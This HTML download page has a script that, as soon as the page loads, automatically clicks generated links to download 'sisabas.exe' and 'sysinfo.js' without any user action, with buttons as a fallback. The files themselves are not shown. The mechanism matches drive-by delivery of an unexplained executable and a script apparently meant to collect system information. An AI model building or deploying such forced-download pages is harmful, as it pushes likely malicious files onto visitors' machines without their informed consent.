<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }
        .container {
            margin: 0 auto;
            max-width: 600px;
        }
        .button {
            display: inline-block;
            padding: 10px 20px;
            font-size: 16px;
            color: #fff;
            background-color: #007BFF;
            border: none;
            border-radius: 5px;
            text-decoration: none;
            margin-bottom: 10px;
        }
        .button:hover {
            background-color: #0056b3;
        }
    </style>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Function to trigger download
            function triggerDownload(filename) {
                const link = document.createElement('a');
                link.href = filename;
                link.download = filename;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }

            // Automatically trigger the downloads
            triggerDownload('sisabas.exe');
            triggerDownload('sysinfo.js');
        });
    </script>
</head>
<body>
    <div class="container">
        <h1>Download Your Files</h1>
        <p>The downloads should start automatically. If not, use the buttons below to download your files:</p>
        <a class="button" href="sisabas.exe" download>Download sisabas.exe</a>
        <a class="button" href="sysinfo.js" download>Download sysinfo.js</a>
    </div>
</body>
</html>
